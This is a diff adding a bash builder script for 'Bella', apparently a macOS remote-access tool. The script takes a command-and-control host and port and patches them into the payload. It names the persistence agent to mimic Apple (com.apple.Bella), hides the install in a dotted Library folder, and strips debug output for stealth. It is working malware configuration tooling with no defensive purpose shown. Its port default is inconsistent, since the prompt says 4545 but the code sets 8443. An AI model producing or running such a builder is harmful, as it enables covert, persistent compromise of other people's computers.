@@ -1,0 +1,71 @@
+#!/usr/bin/env bash
+if [ $# -eq 0 ]; then
+    printf "Please specify a bella server.\nUSAGE: ./BUILDER 'Bella.py'\n"
+    exit 1
+fi
+bella=$1
+bellaNoExt=${bella%.*}
+BuildsPath=Builds/$(date '+%m-%d@%H_%M')
+os=${OSTYPE//[0-9.]/}
+RED="\033[1;31m"
+GREEN="\033[1;32m"
+BLUE="\033[1;34m"
+YELLOW="\033[1;33m"
+RESET="\033[00m"
+
+export C_INCLUDE_PATH=/System/Library/Frameworks/Python.framework/Headers
+mkdir -p $BuildsPath
+cp $bella $BuildsPath/bella.py
+
+read -p "What should the Launch Agent named? Default is [com.apple.Bella]: " launchagent
+if [[ -z "$launchagent" ]]; then
+	launchagent='com.apple.Bella'
+fi
+read -p "Where should Bella be stored in ~/Library/? Default is [Containers/.bella]: " helperLoc
+if [[ -z "$helperLoc" ]]; then
+ 	helperLoc='Containers/.bella'
+fi
+read -p "Where should Bella connect to: " host
+if [[ -z "$host" ]]; then
+	echo -e '${RED}You need to enter a command and control center IP address / Domain.${RESET}'
+	exit 1
+fi
+read -p "What port should Bella connect on [Default is 4545]: " port
+if [[ -z "$port" ]]; then
+	port=8443
+fi
+
+echo -e ${BLUE}'Configuring your Bella installation'${RESET}
+if [[ $os == 'darwin' ]]; then
+    sed -i '' -e "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py
+    sed -i '' -e "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py
+    sed -i '' -e "s@4545@$port@" $BuildsPath/bella.py
+    sed -i '' -e "s@127.0.0.1@$host@" $BuildsPath/bella.py
+    sed -i '' -e "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
+    sed -i '' -e "s@development = True@development = False@" $BuildsPath/bella.py
+elif [[ $os == 'linux-gnu' ]]; then
+    sed -i "s@com.apple.Bella@$launchagent@" $BuildsPath/bella.py
+    sed -i "s@Containers/.bella@$helperLoc@" $BuildsPath/bella.py
+    sed -i "s@4545@$port@" $BuildsPath/bella.py
+    sed -i "s@127.0.0.1@$host@" $BuildsPath/bella.py
+    sed -i "s@\(^[[:space:]]*\)\(print.*$\)@@g" $BuildsPath/bella.py
+    sed -i "s@development = True@development = False@" $BuildsPath/bella.py
+else
+	echo -e ${RED}'Error: OS Unsupported'${RESET}
+	exit 1
+fi
+
+if [ $? -eq 0 ]
+then
+	echo -e ${GREEN}'Done!'${RESET}
+else
+	echo -e ${RED}'Error inserting config variables!'${RESET}
+	exit 1
+fi
+
+echo -e ${BLUE}'Preparing Python code'${RESET}
+mv $BuildsPath/bella.py $BuildsPath/$bellaNoExt
+echo -e ${GREEN}'Done!'${RESET}
+
+echo -e ${YELLOW}'Built Bella is in' $BuildsPath ${RESET}
+rm $BuildsPath/$bellaNoExt.c $BuildsPath/bella.py* 2>/dev/null
